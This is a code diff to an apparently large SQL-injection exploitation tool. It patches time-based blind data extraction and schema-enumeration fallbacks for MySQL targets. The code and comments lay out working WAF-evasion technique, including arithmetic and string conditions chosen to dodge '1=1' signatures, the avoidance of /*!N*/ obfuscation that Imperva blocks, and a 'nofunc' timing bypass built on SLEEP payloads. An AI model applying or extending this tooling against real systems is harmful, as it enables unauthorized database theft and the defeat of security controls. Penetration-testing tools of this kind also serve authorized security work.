@@ -49061,17 +49061,16 @@ class Enumerator:
                                     _ebf_pw_tag  = getattr(_ebf_pw_fn, "_tag", "")
                                     _ebf_pw_nofunc = getattr(_ebf_pw_fn, "_nofunc", False)
                                     if _ebf_pw_tmpl:
-                                        # Store in _TB_EBF_CACHE and _TB_CALIBRATION_CACHE
+                                        # BUG-3 FIX: Build the cache entry here but defer
+                                        # writing to cache until validation succeeds.
+                                        # Previously, the cache write happened before
+                                        # oracle validation — if validation failed the
+                                        # stale entry persisted and poisoned subsequent
+                                        # _extract_str calls, repeating the failure loop.
                                         _ebf_pw_entry = (_ebf_pw_tmpl, list(_ebf_pw_tc),
                                                          _ebf_pw_wrap, _ebf_pw_tag, _ebf_pw_nofunc)
                                         _ebf_pw_key = f"{_url_tf}:{_det_param_tf}:{_t_sec_tf}"
-                                        _tb_cache_insert(_TB_EBF_CACHE, _ebf_pw_key, _ebf_pw_entry, _TB_EBF_CACHE_MAX)
-                                        _tb_cache_insert(_TB_CALIBRATION_CACHE, _ebf_pw_key, _ebf_pw_thresh, _TB_CALIBRATION_CACHE_MAX)
                                         _pre_ts_pw = getattr(self.config, '_pre_extract_time_sec', None)
-                                        if _pre_ts_pw is not None and float(_pre_ts_pw) != float(_t_sec_tf):
-                                            _ebf_pw_alias = f"{_url_tf}:{_det_param_tf}:{float(_pre_ts_pw)}"
-                                            _tb_cache_insert(_TB_EBF_CACHE, _ebf_pw_alias, _ebf_pw_entry, _TB_EBF_CACHE_MAX)
-                                            _tb_cache_insert(_TB_CALIBRATION_CACHE, _ebf_pw_alias, _ebf_pw_thresh, _TB_CALIBRATION_CACHE_MAX)
                                         # Rebuild timing payload function to use EBF template
                                         def _build_timing_payload_tf(_cond,
                                                                       _tmpl=_ebf_pw_tmpl,
@@ -49087,33 +49086,89 @@ class Enumerator:
                                             _eng_tf, _meth_tf, _url_tf, _data_tf, _dfmt_tf,
                                             _det_param_tf, _orig_tf, _det_tc_tf, _t_thresh_tf,
                                             _t_sec_tf, _build_timing_payload_tf, _tf_rc)
-                                        # Validate EBF oracle with nofunc conditions.
-                                        # For nofunc mode (nofunc=True), the wrapper is the
-                                        # direct "{cond}" form (as confirmed by EBF phase 2
-                                        # with stealth arithmetic conditions). MySQL supports
-                                        # SELECT … WHERE … without FROM so "2>1" and "2<1"
-                                        # embed validly in IF((2>1),SLEEP(T),0) templates.
-                                        # Use arithmetic comparisons (not "1=1"/"1=2") because
-                                        # they are more WAF-evasive: classic "1=1" is a
-                                        # well-known injection signature that many WAFs
-                                        # specifically block, while "2>1" / "2<1" are not.
-                                        _ebf_pw_t = await _timing_eval_fn_tf(
-                                            "'a'<'b'" if not _ebf_pw_nofunc else "2>1")
-                                        _ebf_pw_f = await _timing_eval_fn_tf(
-                                            "'a'>'b'" if not _ebf_pw_nofunc else "2<1")
-                                        if (_ebf_pw_t is not None and _ebf_pw_f is not None
-                                                and _ebf_pw_t != _ebf_pw_f):
+                                        # BUG-1 FIX (CRITICAL): nofunc bypass confirmed by
+                                        # EBF.find() — trust it directly; skip the
+                                        # _timing_eval_fn_tf re-validation round-trip.
+                                        #
+                                        # Root cause of the original failure:
+                                        #   _timing_eval_fn_tf always calls
+                                        #   _obfuscate_extraction_cond() on EVERY payload,
+                                        #   converting e.g. SLEEP( → SlEeP/*!30097*/(  and
+                                        #   IF( → iF/*!30097*/(.  Imperva and similar
+                                        #   WAFs block /*!N*/ comment-injection patterns
+                                        #   regardless of keyword casing, so every probe
+                                        #   returns a fast (non-delayed) response, both
+                                        #   probes fall below the threshold, and the
+                                        #   validation concludes "no oracle" — even when
+                                        #   EBF already proved the bypass works via raw
+                                        #   (unobfuscated) payloads.
+                                        #
+                                        # For nofunc mode the obfuscation is doubly
+                                        # harmful: the bypass depends on plain SQL prefix
+                                        # comparison (e.g. field>=0x4142) with no function
+                                        # calls at all.  _obfuscate_extraction_cond scans
+                                        # the FULL payload string for function-name tokens
+                                        # and injects /*!N*/ even into the outer timing
+                                        # wrapper (SLEEP → SlEeP/*!N*/) — this is the WAF
+                                        # signature that blocks the request.
+                                        #
+                                        # EBF.find() already performed live validation of
+                                        # the bypass with true/false timing probes using
+                                        # RAW payloads (no /*!N*/ obfuscation).  A second
+                                        # validation via _timing_eval_fn_tf is therefore
+                                        # redundant for non-Imperva targets and actively
+                                        # destructive for Imperva/similar targets.
+                                        if _ebf_pw_nofunc:
+                                            # Nofunc bypass: trust EBF, skip re-validation.
                                             _ebf_prewarm_ok = True
                                             _eval_fn = _timing_eval_fn_tf
                                             _oracle_name = "timing_fallback_ebf_prewarm"
+                                            # BUG-2 FIX: propagate nofunc flag into the
+                                            # outer scope so the TBExtract delegation guard
+                                            # at line ~49360 fires correctly, and so the
+                                            # CHAR_LENGTH length-search is skipped (WAF
+                                            # blocks CHAR_LENGTH in nofunc mode anyway).
+                                            _ebf_tf_nofunc = True
+                                            # BUG-3 FIX: write cache only after confirmed.
+                                            _tb_cache_insert(_TB_EBF_CACHE, _ebf_pw_key, _ebf_pw_entry, _TB_EBF_CACHE_MAX)
+                                            _tb_cache_insert(_TB_CALIBRATION_CACHE, _ebf_pw_key, _ebf_pw_thresh, _TB_CALIBRATION_CACHE_MAX)
+                                            if _pre_ts_pw is not None and float(_pre_ts_pw) != float(_t_sec_tf):
+                                                _ebf_pw_alias = f"{_url_tf}:{_det_param_tf}:{float(_pre_ts_pw)}"
+                                                _tb_cache_insert(_TB_EBF_CACHE, _ebf_pw_alias, _ebf_pw_entry, _TB_EBF_CACHE_MAX)
+                                                _tb_cache_insert(_TB_CALIBRATION_CACHE, _ebf_pw_alias, _ebf_pw_thresh, _TB_CALIBRATION_CACHE_MAX)
                                             print(f"[+] [Extract] ExtractionBypassFinder oracle "
-                                                  f"validated (true={_ebf_pw_t} false={_ebf_pw_f}) "
+                                                  f"trusted (nofunc — skipping /*!N*/-obfuscated "
+                                                  f"re-validation to avoid WAF block) "
                                                   f"thresh={_ebf_pw_thresh:.0f}ms", flush=True)
                                         else:
-                                            print("[!] [Extract] EBF bypass found but oracle "
-                                                  "validation still failed — "
-                                                  f"true={_ebf_pw_t!r} false={_ebf_pw_f!r}",
-                                                  flush=True)
+                                            # Non-nofunc bypass: validate via _timing_eval_fn_tf.
+                                            # String comparisons ('a'<'b' / 'a'>'b') are more
+                                            # WAF-evasive than classic '1=1'/'1=2' signatures.
+                                            _ebf_pw_t = await _timing_eval_fn_tf("'a'<'b'")
+                                            _ebf_pw_f = await _timing_eval_fn_tf("'a'>'b'")
+                                            if (_ebf_pw_t is not None and _ebf_pw_f is not None
+                                                    and _ebf_pw_t != _ebf_pw_f):
+                                                _ebf_prewarm_ok = True
+                                                _eval_fn = _timing_eval_fn_tf
+                                                _oracle_name = "timing_fallback_ebf_prewarm"
+                                                # BUG-2 FIX: propagate nofunc flag (False in
+                                                # this branch, but set explicitly for clarity).
+                                                _ebf_tf_nofunc = _ebf_pw_nofunc
+                                                # BUG-3 FIX: write cache only after confirmed.
+                                                _tb_cache_insert(_TB_EBF_CACHE, _ebf_pw_key, _ebf_pw_entry, _TB_EBF_CACHE_MAX)
+                                                _tb_cache_insert(_TB_CALIBRATION_CACHE, _ebf_pw_key, _ebf_pw_thresh, _TB_CALIBRATION_CACHE_MAX)
+                                                if _pre_ts_pw is not None and float(_pre_ts_pw) != float(_t_sec_tf):
+                                                    _ebf_pw_alias = f"{_url_tf}:{_det_param_tf}:{float(_pre_ts_pw)}"
+                                                    _tb_cache_insert(_TB_EBF_CACHE, _ebf_pw_alias, _ebf_pw_entry, _TB_EBF_CACHE_MAX)
+                                                    _tb_cache_insert(_TB_CALIBRATION_CACHE, _ebf_pw_alias, _ebf_pw_thresh, _TB_CALIBRATION_CACHE_MAX)
+                                                print(f"[+] [Extract] ExtractionBypassFinder oracle "
+                                                      f"validated (true={_ebf_pw_t} false={_ebf_pw_f}) "
+                                                      f"thresh={_ebf_pw_thresh:.0f}ms", flush=True)
+                                            else:
+                                                print("[!] [Extract] EBF bypass found but oracle "
+                                                      "validation still failed — "
+                                                      f"true={_ebf_pw_t!r} false={_ebf_pw_f!r}",
+                                                      flush=True)
                         except Exception as _ebf_pw_err:
                             LOG.warning("[_extract_str] EBF pre-warm failed: %s", _ebf_pw_err)
                         if not _ebf_prewarm_ok:
@@ -49606,8 +49661,31 @@ class Enumerator:
         fallbacks = (SCHEMA_ENUM_FALLBACKS
                      .get(self.dbms, {})
                      .get(what, []))
+        # BUG-STACKED-ONLY-DDL-FIX (HIGH; Enumerator.get; MySQL/MariaDB; T/TH/HQ/BT
+        # timing techniques; all surfaces; all HTTP methods):
+        # SCHEMA_ENUM_FALLBACKS for MySQL contains DDL statements that are only valid
+        # in a stacked-injection context (SHOW TABLES FROM `{db}`,
+        # SHOW COLUMNS FROM `{db}`.`{table}`, DESCRIBE `{db}`.`{table}`).
+        # These DDL statements CANNOT be used as scalar subqueries in timing conditions
+        # (e.g. `(SHOW TABLES FROM \`main\`)>=0x4142` is invalid MySQL) — the server
+        # returns a syntax error, the oracle returns False for every probe, and the
+        # extraction produces an empty string for every character position.
+        # Previously these stacked-only queries were tried unconditionally; on a timing
+        # target with nofunc mode, each one triggered 128×(bits_per_char) HTTP probes
+        # before silently returning "" — wasting thousands of requests with no output.
+        # Fix: skip DDL-statement fallbacks (SHOW, DESCRIBE) when the injection technique
+        # is not stacked (S, DS, SO, ST).  Timing/boolean techniques cannot execute DDL.
+        _tech_for_fb = getattr(getattr(self, 'result', None), 'technique', '') or ''
+        _is_stacked_tech = _tech_for_fb in ('S', 'DS', 'SO', 'ST')
+        _DDL_STMT_PREFIXES = ('SHOW ', 'DESCRIBE ', 'DESC ', 'EXEC ', 'CALL ')
         for fb_template in fallbacks:
             try:
+                # Skip DDL statements on non-stacked techniques.
+                _fb_upper = fb_template.strip().upper()
+                if not _is_stacked_tech and any(_fb_upper.startswith(p) for p in _DDL_STMT_PREFIXES):
+                    LOG.debug(f"[EnumFallback] Skipping DDL-only fallback on non-stacked "
+                              f"tech={_tech_for_fb!r}: {fb_template[:60]!r}")
+                    continue
                 fb_sql = fb_template.format(**fmt)
                 fb_sql = self._preprocess_sql(fb_sql, what)
                 fb_result = await self._extract_str(fb_sql)
